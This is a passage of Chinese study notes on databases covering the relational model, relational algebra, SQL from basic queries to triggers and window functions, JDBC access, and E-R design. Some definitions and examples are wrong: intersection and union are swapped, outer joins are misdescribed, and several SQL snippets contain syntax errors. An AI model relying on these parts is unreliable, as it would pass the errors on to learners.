- 负责将数据从磁盘上渠道内存中，并决定哪些数据应被缓冲在内存中\n- 存储管理器实现了几种数据结构\n    - 数据文件\n        - 存储数据库自身\n    - 数据字典\n        - 存储关于数据库结构的元数据\n    - 索引\n        - 提供对于数据项的快速访问\n\n### 查询处理器\n 查询处理器组件包括：\n- DDL解释器\n    - 解释DDL语句并将这些定义记录在数据字典中 \n- DML编译器\n    - 将查询语言中的DML语句翻译为包括一系列查询执行引擎能理解的低级指令的执行方案 \n- 查询执行引擎\n    - 执行由DML编译器产生的低级指令\n\n### 事务管理\n\n- **事务**是数据库应用中完成单一逻辑功能的操作集合\n\n## 关系模型介绍\n\n### 关系模型\n\n- 关系（relation）是**无序**集合，包含表示实体的属性之间的关系\n- 域（domain）是关系的每个属性的允许取值的集合\n- 元组（tuple）是关系中的一组属性值\n    - 值（通常）是原子/标量\n        - 原子：一个域中的元素被认为是不可再分的单位\n    - 空值是每个域的成员\n\n### 数据库模式（database schema）\n\n- A1, A2, ..., An 是属性\n- R = (A1, A2, ..., An ) 是一个关系模式（relation schema）\n- 例：\n    - instructor = (ID, name, dept_name, salary)\n    - 在模式 R 上定义的关系实例 r 用 r(R) 表示\n    - 关系的当前值由表指定\n    - 关系 r 的元素 t 称为元组，由表中的一行表示\n\n### 键\n\n- 超键（superkey）\n    - 一个或多个属性的集合\n    - 将这些属性组合在一起可以在一个关系中唯一地标识出一个元组\n- 候选键（candidate key）\n    - 最小超键\n    - 其任意真子集都不是超键\n- 主键（primary key）\n    - 被数据库设计者选中来作为在一个关系中区分不同元组的主要方式的候选键\n    - 如果表没有定义一个主键，一些 DBMS 会自动创建一个内部主键\n        - SEQUENCE (SQL:2003)\n        - AUTO_INCREMENT (MySQL)\n- 外键约束（foreign-key constraint）\n    - 一个关系中的值必须出现在另一个关系中\n        - 引用关系（referencing relation）\n        - 被引用关系（referenced relation）\n    - 被引用属性（集）必须是被引用关系的**主键**\n    - 是引用完整性约束的一种**特例**\n- 引用完整性约束（referential integrity constraint）\n    - 引用关系中的任意元组在指定属性上出现的取值也必然出现在被引用关系中至少一个元组的指定属性上\n\n### 关系代数（relational algebra）\n\n- 检索和操作关系中的元组的基本操作\n    - 基于集合代数\n- 每个算子将一个或多个关系作为其输入并输出一个新关系\n    - 可以将运算符链接在一起以创建更复杂的运算\n\n#### 选择运算（select）\n\n从满足选择谓词的关系中选择元组的子集\n$\\sigma_{dept\\_name=\"Physics\"}(instructor)$\n$\\sigma_{dept\\_name=\"Physics\" \\lor salary>90000}(instructor)$\n\n#### 投影运算（projection）\n\n使用仅包含指定属性的元组生成关系\n$\\Pi_{ID,salary/12}(instructor)$\n\n#### 笛卡尔积运算（product）\n\n从输入关系生成一个包含所有可能的元组组合的关系\n$instructor \\times tearches$\n\n#### 连接运算（join）\n生成包含所有元组的关系，这些元组是两个元组（每个输入关系中的一个）与一个或多个属性的公共值的组合\n$r\\Join_{\\theta} s=\\sigma_{\\theta}(r\\times s)$\n$instructor\\Join_{instructor.ID=teaches.ID}teaches$\n\n#### 集合运算\n\n##### 交（intersection）\n生成包含仅出现在一个或两个输入关系中的所有元组的关系\n$r\\cap s$\n\n##### 并（union）\n生成一个只包含出现在两个输入关系中的元组的关系\n$r\\cup s$\n\n##### 差（difference）\n生成一个只包含出现在第一个而不是第二个输入关系中的元组的关系\n$r-s$\n\n#### 更名运算（rename）\n为关系代数表达式的结果提供名称\n$\\rho_{i}(instructor)$\n$\\rho_{i(A_1,A_2,...)}(instructor)$\n\n#### 赋值运算（assignment）\n将关系代数表达式分配给临时关系变量\n查询可以写成由一系列赋值组成的顺序程序\n$Physics \\leftarrow \\sigma_{dept\\_name=\"Physics\"}(instructor)$\n\n#### 聚合运算（aggregation）\n\n允许在查询返回的一组值上计算函数\n- average, sum, min, max, count, …\n \n$a\\_id \\gamma min(b\\_id),sum(b\\_id)(r)$\n\n#### 等价查询\n在关系代数中编写查询的方法不止一种\n$\\sigma_{dept\\_name=\"Physics\"\\land salary>90000}(instructor)$\n$\\sigma_{dept\\_name=\"Physics\"}(\\sigma_{salary>9000}(instructor))$\n## SQL介绍\n\n### SQL组成\n\n- 数据操作语言 (DML)\n- 数据定义语言 (DDL)\n    - 完整性约束\n    - 视图定义\n    - 授权\n- 数据控制语言 (DCL)\n    - 事务控制\n    - 嵌入式 SQL 和动态 SQL\n\n### 数据定义\n\n- char(n)：具有指定长度n的固定长度的字符串\n- varchar(n)：具有最大长度n的可变长度的字符串\n- int：整数\n- smallint：小整数\n- numeric(p,d)：具有指定精度的定点数，这个数有p位数字（加上一个符号位），且小数点右边有p位中的d位数字\n- real, double precision：浮点数与双精度浮点数\n- float(n)：精度至少为n为数字的浮点数\n\n### 建表\n\n```sql\nCREATE TABLE relation_name \n    (Attribute1 Domain1, \n    Attribute2 Domain2,\n     ..., \n     Attributen Domainn,\n     (integrity-constraint1),\n     ...,\n     (integrity-constraintk)\n    );\n```\n\n例：\n\n```sql\ncreate table instructor\n    (ID        varchar(5),\n     name        varchar(20) not null,\n     dept_name     varchar(20),\n     salary        numeric(8,2),\n     primary key(ID),\n     foreign key(dept_name) references department\n    );\n```\n\n### 更新表\n\n```sql\n-- 插入数据\nINSERT INTO instructor(ID, name, dept_name, salary) VALUES('10211', 'Smith', 'Biology', 66000);\n-- 删除数据，但不删除表\nDELETE FROM instructor WHERE ID= '10211';\n-- 更新数据\nUPDATE instructor SET name='Tom', salary=55000 WHERE ID= '10211';\n-- 删除表\nDROP TABLE instructor;\n-- 改变表结构\nALTER TABLE instructor ADD address varchar(20);\nALTER TABLE instructor DROP address;\n```\n\n### 查询语句\n\n**SELECT FROM**\n\n```sql\n-- 星号查询所有的属性\nSELECT * FROM instructor;\n-- 使用DISTINCT关键字去重\nSELECT DISTINCT name FROM instructor;\n-- 使用AS关键字为属性别名\nSELECT id, name, salary*1.1 AS new_salary FROM instructor;\n-- 常量的使用\nSELECT id, name, salary*1.1 new_salary,'Good' FROM instructor;\n-- 函数的使用\nSELECT id, name, now() FROM instructor;\n-- 伪表的使用\nSELECT now() FROM DUAL;\n-- 伪表的省略\nSELECT now();\n-- 多表联合查询\nSELECT * FROM instructor, section;\n-- 使用AS关键字为表创建别名\nSELECT * FROM instructor AS t1, instructor t2;\n-- 为嵌套子查询表创建别名\nSELECT * FROM (select id, name from instructor) t;\n-- 使用NATURAL JOIN进行自然连接\nSELECT * FROM instructor NATURAL JOIN teaches;\n```\n\n**SELECT FROM WHERE**\n\n```sql\n-- WHERE关键字基本使用\nSELECT * FROM instructor WHERE salary>50000;\n-- 使用逻辑连接词 使用LIKE关键字模糊查询，%表示匹配任意子串，_表示匹配任意单个字符\nSELECT * FROM instructor WHERE salary>50000 AND name LIKE '%d_r%';\n-- 使用ESCAPE改变转义符号\nSELECT * FROM instructor WHERE salary>50000 AND name LIKE '%100\\%'\nESCAPE '\\ ';\n-- 使用字符串运算函数\nSELECT * FROM instructor WHERE length(name)>5;\n-- 使用||管道符号连接字符串\nSELECT * FROM instructor WHERE name='Go'||'ld';\n-- 使用BETWEEN AND关键字\nSELECT * FROM instructor WHERE salary BETWEEN 90000 AND 100000;\n-- 使用元组符号进行比较\nSELECT name, course_id FROM instructor, teaches WHERE (instructor.id, dept_name) = (teaches.id, 'Biology');\n```\n\n**SELECT FROM GROUP BY HAVING**\n\n```sql\n-- 使用聚集函数max,min,count,avg,sum\nSELECT avg(salary) FROM instructor;\n-- 使用聚集函数内嵌套DISTINCT关键字去重\nSELECT count(DISTINCT id) FROM teaches;\n-- 使用GROUP BY关键字分组聚集\nSELECT dept_name, avg(salary) FROM instructor GROUP BY dept_name;\n-- 错误写法！id既没出现在聚集函数中，也没出现在GROUP BY中\nSELECT id, dept_name, avg(salary) FROM instructor GROUP BY dept_name;\n-- 在HAVING关键字中可以使用聚集函数\n-- 与SELECT关键字相同，出现在HAVING子句中的属性必须要么被聚集，要么出现在GROUP BY子句中\nSELECT dept_name, avg(salary) FROM instructor GROUP BY dept_name\nHAVING avg(salary)>42000;\n```\n\n**SELECT FROM ORDER BY**\n\n```sql\n-- 使用ORDER BY关键字对结果集排序\nSELECT * FROM instructor ORDER BY name;\n-- 使用DESC,ASC关键字进行降/升排序\nSELECT * FROM instructor ORDER BY name DESC, salary ASC;\n-- 使用属性别名进行排序\nSELECT id, name, salary*1.1 AS new_salary FROM instructor ORDER BY new_salary;\n-- 使用属性下标进行排序\nSELECT id, name, salary*1.1 AS new_salary FROM instructor ORDER BY 3;\n```\n\n### 集合运算\n\n```sql\n-- 集合运算均自动去重，如果需要保留重复项，需要添加ALL关键字\n-- 并运算\n(SELECT course_id  FROM section WHERE sem = 'FALL' AND year = 2017) \nUNION\n(SELECT course_id FROM section WHERE sem = 'Spring' AND year = 2018)\n-- 交运算，使用ALL关键字\n(SELECT course_id FROM section WHERE sem = 'Fall' AND year = 2017)\nINTERSECT ALL\n(SELECT course_id FROM section WHERE sem = 'Spring' AND year = 2018)\n-- 差运算\n(SELECT course_id FROM section WHERE sem = 'Fall' AND year = 2017)\nEXCEPT\n(SELECT course_id FROM section WHERE sem = 'Spring' AND year = 2018)\n```\n\n### 空值\n\n- 任何涉及 null 的算术表达式的结果都是 null\n    - 5 + null returns null\n- 任何涉及null的比较的结果都是unknown\n    - 5 &lt; null or null <&gt; null or null = null\n- unknown有关的布尔运算\n    - (true AND unknown) = unknwon\n    - (false AND unknown) = false\n    - (unknown AND unknown) = unknown\n    - (true OR unknown) = true\n    - (false OR unknown) = unknown\n    - (unknown OR unknown) = unknown\n    - (NOT unknown) = unknown\n- 如果 where 子句谓词的结果为 unknown，则它的结果被视为 false\n- 谓词IS NULL/IS NOT NULL可用于检查空值\n- 谓词IS UNKNOWN/IS NOT UNKNOWN可用于检测unknown（区别于true和false）\n\n```sql\nSELECT name FROM instructor WHERE salary IS NULL;\n```\n\n#### 聚集函数和空值\n\n- 除了count(\\*)之外的所有聚集函数都忽略其输入集合的空值\n- 空集的count运算值为0\n\n### 子查询\n子查询是嵌套在另一个查询中的select-from-where表达式\n\n#### 集合成员资格\n\n```sql\n-- IN关键字测试成员资格\nSELECT DISTINCT course_id FROM section \nWHERE semester = 'Fall' AND year= 2017 AND course_id IN \n(select course_id from section where semester = 'Spring' and year= 2018);\n\n-- NOT IN关键字测试成员资格的缺失\nSELECT DISTINCT course_id FROM section \nWHERE semester = 'Fall' AND year= 2017 AND course_id NOT IN \n(select course_id from section where semester = 'Spring' and year= 2018);\n\n-- 用于枚举集合\nSELECT DISTINCT name FROM instructor WHERE name NOT IN ('Mozart', 'Einstein');\n\n-- 用于多属性测试成员资格\nSELECT count (DISTINCT ID) from takes \nWHERE (course_id, sec_id, semester, year) IN \n(SELECT course_id, sec_id, semester, year FROM teaches where teaches.ID= 10101);\n```\n\n#### 集合比较\n\n```sql\n-- >,<,>=,<=,<>,= SOME关键字用于表达至少比某一个大/小/相等\nSELECT name FROM instructor WHERE salary > SOME \n(select salary from instructor  where dept name = 'Biology');\n\n-- >,<,>=,<=,<>,= ALL关键字用于表达比所有的大/小/相等\nSELECT name FROM instructor WHERE salary > ALL \n(select salary from instructor  where dept name = 'Biology');\n```\n \n#### 空关系测试\n\n```sql\n-- EXISTS作为在参数的子查询非空时返回true值\n-- NOT EXISTS在作为参数的子查询为空时返回true值\n-- 来自外层查询的相关名称可以用在WHERE子句的查询中，此时该子查询被称为相关子查询（correlated subquery）\n-- 关系A包含关系B可以写成not exists(B except A)\nSELECT course_id \nFROM section AS S\nWHERE semester = 'Fall' AND year = 2017 AND \nEXISTS (select * \n        from section as T \n        where semester = 'Spring' and year= 2018 and S.course_id = T.course_id);\n```\n\n#### 重复元组存在性测试\n\n```sql\n-- UNIQUE在作为参数的子查询没有重复的元组时返回true值\n-- NOT UNIQUE在作为参数的子查询有重复的元组时返回true值\nSELECT t.course_id FROM course t \nWHERE UNIQUE (select r.course_id from section r \n              where t.course_id= r.course_id and r.year = 2017);\n```\n\n#### FROM子句的子查询\n\n```sql\n-- 使用AS关键字为子查询结果起别名，并对属性进行重命名\nSELECT dept_name, avg_salary FROM ( \n    select dept_name, avg (salary) \n    from instructor\n    group by dept_name\n    ) AS dept_avg (dept_name, avg_salary)\nWHERE avg_salary > 42000;\n-- 使用LATERAL关键字访问同一个FROM子句中在它前面的表或子查询的属性\nSELECT name, salary, avg_salary\nFROM instructor I1, LATERAL (select avg(salary) as avg_salary\n                             from instructor I2\n                             where I2.dept_name = I1.dept_name);\n```\n\n#### WITH子句\n\n```sql\n-- 使用WITH关键字定义临时关系\nWITH max_budget (value) AS (select max(budget) from department)\nSELECT department.name FROM department, max_budget\nWHERE department.budget = max_budget.value;\n```\n\n#### 标量子查询（scalar subquery）\n\n- SQL允许子查询出现在返回单个值的表达式能够出现的任何地方，只要该子查询**只返回一个包含单个属性的元组**\n- 标量子查询可以出现在select，where和having子句中\n\n```sql\nSELECT dept_name,\n    (select count(*) from instructor i\n    where d.dept_name = i.dept_name)\n    AS num_instructors\nfrom department d;\n```\n\n### 删除语句\n\n```sql\n-- 注意运行顺序，首先执行avg(salary)并查询到所有的元组后再执行删除\nDELETE FROM instructor WHERE \n salary < (select avg (salary) from instructor);\n```\n\n### 插入语句\n\n```sql\n-- 可以在查询结果的基础上插入元组\nINSERT INTO instructor\n    select ID, name, dept_name, 18000 \n    from student\n    where dept_name = 'Music' and total_cred > 144;\n    \n-- 另一种插入方式\nSELECT  ID, name, dept_name, 18000\nINTO instructor\nFROM student\nWHERE dept_name = 'Music' AND total_cred > 144;    \n```\n\n### 修改语句\n\n```sql\n-- 使用CASE以避免更新次序引发问题\nUPDATE instructor  \n    SET salary = CASE\n        WHEN salary <= 100000 THEN salary * 1.05\n        ELSE salary * 1.03\n    END\n-- 使用标量子查询\nUPDATE student\n    SET tot_cred = (\n        select sum(credits)\n        from takes, course\n        where student.ID = takes.ID and\n            takes.course_id = course.course_id and\n            takes.grade <> 'F' and\n            takes.grade is not null);\n```\n\n## 中级SQL\n\n### 连接表达式\n\n#### 内连接（inner join）\n\n- 不保留未匹配元组\n\n#### 外连接（outer join）\n\n- 左外连接（left outer join）\n    - 只保留出现在左外连接运算之前（左边）的关系中的元组\n- 右外连接（right outer join）\n    - 只保留出现在右外连接运算之后（右边）的关系中的元组\n- 全外连接（full outer join）\n    - 保留出现在两个关系中的元组\n\n#### 连接条件\n\n- natural\n    - 自然连接\n- on&lt;predicate&gt;\n    - 允许在参与连接的关系上设置通用的谓词\n- using(A1,A2...An)\n    - 设定指定属性上的取值相匹配\n\n### 视图\n\n```sql\n-- 使用VIEW关键字创建视图\nCREATE VIEW faculty AS \n    select ID, name, dept_name from instructor;\n-- 使用视图\nSELECT name FROM faculty WHERE dept_name = 'Biology';\n-- 视图嵌套视图\nCREATE VIEW physics_fall_2017 AS\n    select course.course_id, sec_id, building, room_number\n    from course c, section s\n    where c.course_id = s.course_id and c.dept_name = 'Physics'\n        and s.semester = 'Fall' and s.year = '2017';\nCREATE VIEW physics_fall_2017_watson AS\n    select course_id, room_number  from physics_fall_2017\n    where building= 'Watson';\n```\n\n#### 视图更新\n\n仅允许对简单视图进行更新（update、insert、delete）\n\n- from 子句只有一个数据库关系\n- select 子句仅包含关系的属性名，不包含任何表达式、聚集或distinct声明\n- 任何未在 select 子句中列出的属性都可以取 null 值\n- 查询没有 group by 或 having 子句\n\n可以通过在视图定义的末尾插入with check option子句来防止更新不满足视图的定义\n\n### 事务\n\n- 提交事务（commit work）\n- 回滚事务（rollback work）\n\n### 完整性约束\n- not null\n    - 非空约束，不允许存在空值\n- primary key(A1,A2,...,Am)\n    - 主键约束，属性A1,A2,...,Am形成主键\n- unique( A1, A2, …, Am)\n    - 唯一性约束，属性A1,A2,...,Am形成超键（可以为空）\n- check (P)\n    - 指定一个谓词P，关系中的每个元组都必须满足谓词P\n- foreign key (…) references t(…)\n    - 外键约束，被指定的属性列表必须声明为被引用关系的超键，即主键约束或唯一性约束\n\n```sql\nFOREIGN KEY (dept_name) REFERENCES department\nON DELETE CASCADE     -- 级联删除\nON UPDATE CASCADE    -- 级联更新\nON DELETE SET NULL    -- 级联置空\nON DELETE SET DEFAULT    -- 级联置默认值\nON DELETE RESTRICT    -- 禁止级联\n```\n\n- assertion\n    - 断言，即谓词\n\n```sql\nCREATE ASSERTION credits CHECK\n(NOT EXISTS(SELECT ID FROM student))\n```\n\n### SQL固有属性\n\n- date：日历日期，包括年（四位）、月和日\n\n```sql\ndate '2005-7-27'\n```\n\n- time：一天中的时间，用时分秒来表示\n\n```sql\ntime '09:00:30'\n```\n\n- timestamp：date和time的结合\n\n```sql\ntimestamp  '2005-7-27 09:00:30.75'\n```\n\n- interval：区间，允许在日期、时间和时间区间上进行计算\n\n```sql\ninterval '1' day\n```\n\n- blob/clob：二进制/字符大对象\n\n```sql\nbook_review clob(10KB)\nimage blob(10MB)\n```\n\n### 类型转换&缺省值\n\n```sql\n-- 使用CAST函数将varchar类型的ID强制转换为numeric\nSELECT CAST(ID AS numeric(5))AS inst_id\nFROM instructor\n\n-- 使用COALESCE函数改变空值显示方式\n-- COALESCE函数要求所有参数必须是相同的类型\nSELECT ID,COALESCE(salary,0)AS salary\nFROM instructor\n\n-- 使用DEFAULT定义缺省值\nCREATE TABLE student\n(tot_credit NUMERIC(3,0) DEFAULT 0);\n```\n\n### 用户自定义类型（UDT）&域\n\n```sql\n-- 使用TYPE关键字自定义类型\nCREATE TYPE Dollars AS numeric (12,2) FINAL;\n-- 使用自定义类型\nCREATE TABLE dept(name varchar (20),building varchar(15),budget Dollars);\n\n-- 使用DOMAIN关键字自定义域，允许添加完整性约束\nCREATE DOMAIN person_name char(20) NOT NULL;\n-- 域允许使用CONSTRAINT关键字添加约束\nCREATE DOMAIN degree_level varchar(10) \n    CONSTRAINT degree_level_test\n        CHECK (value in ('Bachelors', 'Masters', 'Doctorate'));\n```\n\n### 索引\n\n```sql\n-- 基础建表，ID为主键\nCREATE TABLE student (ID varchar (5), \n                      name varchar (20) not null,\n                      dept_name varchar (20),\n                      tot_cred numeric (3,0) default 0,\n                      primary key (ID));\n-- UNIQUE INDEX使用候选键作为索引\nCREATE UNIQUE INDEX studentName_index ON student(name);\n-- INDEX创建一般索引\nCREATE INDEX studentDept_index ON student(dept_name);\n-- 显示索引\nSHOW INDEX ON student;\n-- 删除索引\nDROP INDEX studentName_index;\n```\n\n### 授权\n\n#### 权限授予与收回\n\n```sql\n-- 授予权限\n-- GRANT <权限列表> ON <关系名或视图名> TO <用户/角色列表>;\n-- WITH GRANT OPTION表示该用户可以将自己拥有的权限授权给别人\nGRANT select/insert/delete/update/all privilege ON instructor TO U1, U2, U3/public WITH GRANT OPTION;\n-- 表示仅可更新budget属性\nGRANT update(budget) ON department TO U1;\n\n-- 回收权限\n-- REVOKE <权限列表> ON <关系名或视图名> FROM <用户/角色列表>;\n-- CASCADE表示级联收权，RESTRICT表示禁止级联收权\nREVOKE select ON student FROM U1, U2, U3 CASCADE/RESTRICT;\n```\n\n#### 角色\n\n```sql\n-- 创建角色\nCREATE ROLE teaching_assistant;\nCREATE ROLE instructor;\n\n-- 角色被授予权限\nGRANT select ON takes TO teaching_assistant;\n-- 角色授予角色\nGRANT teaching_assistant TO instructor;\n-- 角色授予用户\nGRANT instructor TO Satoshi;\n```\n\n## 高级SQL\n\n### 使用程序设计语言访问SQL\n\n- 使用一组函数连接到数据库服务器进行通信\n    - **JDBC**\n    - ODBC\n    - 本地库\n- 嵌入式 SQL\n    - SQLJ\n\n例：\n```java\nimport java.sql.*;\n\npublic class jdbcSelect {\n    public static void main(String[] args) {\n        Connection c = null;\n        Statement stmt = null;\n        try {\n            Class.forName(\"org.postgresql.Driver\");\n            //Open a connection\n            c = DriverManager.getConnection(\"jdbc:postgresql://d-sketon.top:15432/newdb\", \"root\", \"root\");\n            c.setAutoCommit(false);\n            System.out.println(\"Connect to database gaussdb successfully !\");\n            //Create a statement object\n            stmt = c.createStatement();\n            //Execute the statement\n            ResultSet rs = stmt.executeQuery(\"SELECT * FROM employee;\");\n            while (rs.next()) {\n                //Process the result set\n                int id = rs.getInt(\"id\");\n                String name = rs.getString(\"name\");\n                int age = rs.getInt(\"age\");\n                String address = rs.getString(\"address\");\n                float salary = rs.getFloat(\"salary\");\n                System.out.println(\"ID = \" + id);\n                System.out.println(\"NAME = \" + name);\n                System.out.println(\"AGE = \" + age);\n                System.out.println(\"ADDRESS = \" + address);\n                System.out.println(\"SALARY = \" + salary);\n                System.out.println();\n            }\n            rs.close();\n            stmt.close();\n            c.close();\n        } catch (Exception e) {\n            //Exception mechanism\n            System.err.println(e.getClass().getName() + \": \" + e.getMessage());\n            System.exit(0);\n        }\n        System.out.println(\"Operation done successfully !\");\n    }\n}\n```\n\n### 函数和过程\n\n```sql\n-- SQL中定义的函数\nCREATE FUNCTION dept_count(dept_name varchar(20))\n    RETURN INTEGER\n    BEGIN\n    DECLARE d_count INTEGER;\n        SELECT COUNT(*) INTO d_count\n        FROM instructor\n        WHERE instructor.dept_name = dept_name\n    RETURN d_count;\n    END\n-- 使用函数\nSELECT dept_name,budget\nFROM department\nWHERE dept_count(dept_name)>12;\n\n-- SQL中的表函数\nCREATE FUNCTION instructor_of(dept_name varchar(20))\n    RETURNS TABLE(\n        ID VARCHAR(5),\n        name VARCHAR(20)\n    )\nRETURN TABLE\n    (SELECT ID,name\n    FROM instructor\n    where instructor.dept_name=dept_name);\n-- 使用函数\nSELECT * FROM TABLE(instructor_of('Finance'));\n\n-- SQL中的过程定义\nCREATE PROCEDURE dept_count_proc(IN dept_name VARCHAR(20),out d_count INTEGER)\nBEGIN\n    SELECT COUNT(*) INTO d_count\n    FROM instructor\n    WHERE instructor.dept_name=dept_name\nEND\n-- 使用过程\nDECLARE d_count INTEGER;\nCALL dept_count_proc( 'Physics', d_count);\n```\n\n#### 用于过程和函数的语言结构\n\n```sql\n-- 基础复合语句\nBEGIN\n...\nEND\n-- 其中包含的所有语句作为单个事务来执行\nBEGIN ATOMIC\n...\nEND\n\n-- while语句\nWHILE 布尔表达式 DO\n    语句序列;\nEND WHILE\n\n-- for语句\nFOR 布尔表达式 DO\n    语句序列;\nEND FOR\n\n-- repeat语句\nREPEAT\n    语句序列;\nUNTIL 布尔表达式\nEND REPEAT\n\n-- if-then-else语句\nIF 布尔表达式\n    THEN 语句或复合语句\nELSEIF 布尔表达式\n    THEN 语句或复合语句\nELSE 语句或复合语句\nEND IF\n```\n\n### 触发器\n\n```sql\n-- 操作之后触发update/insert/delete/select\nCREATE TRIGGER credits_earned AFTER UPDATE grade ON takes\n-- 操作之前触发update/insert/delete/select\nCREATE TRIGGER credits_earned BEFORE UPDATE grade ON takes\n\n-- 过渡行\nREFERENCING NEW ROW AS nrow\nREFERENCING OLD ROW AS orow\n-- 过渡表（不能用于before触发器）\nREFERENCING NEW TABLE AS ntable\nREFERENCING OLD TABLE AS otable\n\n-- 针对每个受影响的行执行一个操作\nFOR EACH ROW\n-- 正对整条SQL语句执行单个操作\nFOR EACH STATEMENT\n\nWHEN nrow.grade <> 'F' AND nrow.grade IS NOT NULL AND (orow.grade = 'F' OR orow.grade IS NULL)\nBEGIN ATOMIC\n    UPDATE student\n        SET tot_cred=tot_cred+\n        (SELECT credits\n        FROM course\n        WHEN course.course_id=nrow.course_id)\n    WHEN student.id=nrow.id;\nEND;\n```\n\n### 递归查询\n\n```sql\n-- 使用WITH RECURSIVE建立递归视图\nWITH RECURSIVE rec_prereq(course_id, prereq_id) as (\n    select course_id, prereq_id from prereq\n    union\n    select rpr.course_id, pr.prereq_id,\n    from rec_prereq rpr, prereq pr where rpr.prereq_id = pr.course_id\n)\nSELECT ∗ FROM rec_prereq;\n```\n\n### 排名\n\n```sql\n-- 使用rank函数进行排名\nSELECT ID, rank() over (order by GPA desc) AS s_rank FROM grades;\n-- dense_rank函数不会产生空档\nSELECT ID, dense_rank() over (order by GPA desc) AS s_rank \nFROM grades;\n-- nulls last/nulls first指定空值在排名中的位置\nSELECT ID, dense_rank() over (order by GPA desc nulls last) AS s_rank \nFROM grades;\n-- 使用partition by关键字选择在不同的分区里进行排名\nSELECT ID, dept_name,\n    rank() over(partition by dept_name order by GPA desc) as dept_rank\nFROM grades\nORDER BY dept_name, dept_rank;\n\n```\n\n### 分窗\n\n```sql\n-- 前一个到后一个之间分窗\nSELECT date, sum(value) over \n    (order by date rows between 1 preceding and 1 following)\nFROM sales\n-- 含当前行\nSELECT date, sum(value) over \n    (order by date rows bewtween 1 preceding and current row)\nFROM sales\n-- 使用partition by关键字选择在不同的分区里分窗\n-- unbounded preceding代表前面所有数据分窗\nselect account, date, sum(value) over\n    (partition by account order by date rows unbounded preceding) as bal\nFROM transaction ORDER BY account, date\n```\n## 使用E-R模型的数据库设计\n### 实体-联系模型\n#### 实体集\n- 是共享相同性质或属性的、具有相同类型的实体的集合\n- 通过一组属性（attribute）来表示\n- 在E-R图中用**矩形**来表示\n![1](https://d-sketon.top/img/db-book/1.png)\n#### 联系集\n- 是在n&ge;2个（可能相同的）实体集上的数学关系\n- 在E-R图中用**菱形**来表示\n![2](https://d-sketon.top/img/db-book/2.png)\n- 联系集可以递归进行\n![3](https://d-sketon.top/img/db-book/3.png)\n- 联系可以具有被称作**描述性属性**的属性\n- 联系集的属性在E-R图中通过**未分割的矩形**来表示\n![4](https://d-sketon.top/img/db-book/4.png)\n#### 复杂属性\n- 属性类型\n- **简单**和**复合**属性\n    - 简单属性不能被划分为子部分，而复合属性可以被划分为子部分\n- **单值**和**多值**属性\n    - 单值属性对于一个特定实体都只有单独的一个值\n- **派生属性**\n    - 这类属性的值可以从其他相关属性或实体的值派生出来\n\n![5](https://d-sketon.top/img/db-book/5.png)\n#### 映射基数\n表示一个实体能通过一个联系集关联的另一些实体的数量\n- **一对一**：A中的一个实体**至多**与B中的一个实体相关联，并且B中的一个实体也**至多**与A中的一个实体相关联\n- **一对多**：A中的一个实体可以与B中**任意数量**的实体相关联，而B中的一个实体**至多**与A中的一个实体相关联\n- **多对一**：A中的一个实体**至多**与B中的一个实体相关联，而B中的一个实体可以与A中**任意数量**的实体相关联\n- **多对多**：A中的一个实体可以与B中**任意数量**的实体相关联，并且B中的一个实体也可以与A中**任意数量**的实体相关联\n\n![6](https://d-sketon.top/img/db-book/6.png)\n\nE-R图中的表示方法：\n![7](https://d-sketon.top/img/db-book/7.png)\n\n用双线表示一个实体在联系集中的全部参与：\n\n![8](https://d-sketon.top/img/db-book/8.png)\n\n线段上可以有一个关联的最小和最大基数，用l..h的形式表示\n\n![9](https://d-sketon.top/img/db-book/9.png)\n### 主键\n#### 实体集\n- 一个实体的属性取值必须可以唯一表示该实体\n- 键（key）的概念直接适用于实体集\n#### 联系集\n属性集合\n$primary-key(E_1)\\cup primary-key(E_2) \\cup ... \\cup primary-key(E_n)$\n构成了联系集的一个超键\n- 二元联系集主键的选择取决于联系集的映射基数\n    - 对于多对多关系，前述主键的并集是最小的超键，并被选作主键\n    - 对于多对一和一对多关系，“多”方的主键是最小的超键，并被选作主键\n    - 对于一对一关系，任意参与实体集的主键都构成最小超键，并可被选作主键\n#### 弱实体集 \n弱实体集的存在依赖于另一个实体集，称其为**标识性实体集**\n使用标识性实体集的主键以及称为**分辨符属性**的额外属性来唯一地标识弱实体\n- E-R图中，通过双边框的矩形描述弱实体集，其分辨符被加上需的下划线\n- 关联弱实体集和标识性强实体集的联系集以双边框的菱形表示\n- 通常，弱实体集必须全部参与其标识性联系集，并且该联系是到标识性实体集的多对一联系\n\n![10](https://d-sketon.top/img/db-book/10.png)\n### 扩展的E-R特性\n#### 特化（Specialization）/概化（Generalization）\n- 在一个高层实体集与一个或多个低层实体集之间存在的包含关系\n- 重叠特化：允许一个实体属于多个特化实体集（使用两个单独的箭头）\n- 不相交特化：允许一个实体至多属于一个特化实体集（使用单个箭头）\n\n![11](https://d-sketon.top/img/db-book/11.png)\n\n- 全部特化/概化：每个高层实体必须属于一个低层实体集\n- 部分特化/概化：一些高层实体可以不属于一个低层实体集（默认）\n#### 聚集（Aggregation）\n- 一种抽象，通过这种抽象，联系被视为高层实体\n\n![12](https://d-sketon.top/img/db-book/12.png)\n### 将E-R图转换为关系模式\n#### 强实体集的表示\n强实体集的主键就作为所得到的模式的主键\n#### 具有复杂属性的强实体集的表示\n- 复合属性\n    - 不为复合属性自身创建一个单独的属性\n- 多值属性\n    - 为多值属性构建一个新的关系模式\n- 派生属性\n    - 不在关系数据模型中显式地表示出来\n#### 弱实体集的表示\n对于从弱实体集转换而来的模式，该模式的主键由其强实体集的主键与弱实体集的分辨符组合而成。除了创建主键之外，还需要在关系上建立外键约束，以保证对于表示弱实体的每个元组，都有一个表示相应强实体的元组与之对应\n#### 联系集的表示\n联系集的主键属性也被用作关系模式的主键属性\n#### 模式的冗余\n连接弱实体集与之对应的强实体集的联系集的模式是冗余的 \n#### 模式的合并\n- 对于多对一联系集，联系集的关系模式可以和“多”方的模式进行合并\n- 对于一对一联系集，联系集的关系模式可以和参与联系的任何一个实体集的模式进行合并\n### 实体-联系设计问题\n#### E-R图中的创建错误\n- 使用一个实体集的主键作为另一个实体集的属性\n- 将相关实体集的主键属性作为联系集的属性\n- 在需要多值属性的情况下使用具有单值属性的联系\n#### 使用实体集还是属性？\n对于这一问题并无简单的答案。区分它们主要依赖于被建模的显示企业的结构，以及与被讨论的属性相关的语义\n#### 使用实体集还是联系集？\n当描述发生在实体间的行为时建议采用联系集\n#### 二元还是n元联系集？\n一个非二元的联系集总可以用一组不同的二元联系集来替代\n## 关系数据库设计\n### 分解\n- 避免模式中存在信息重复问题的唯一方式是将其分解为多个模式\n- 并非所有的模式分解都是有益的\n- 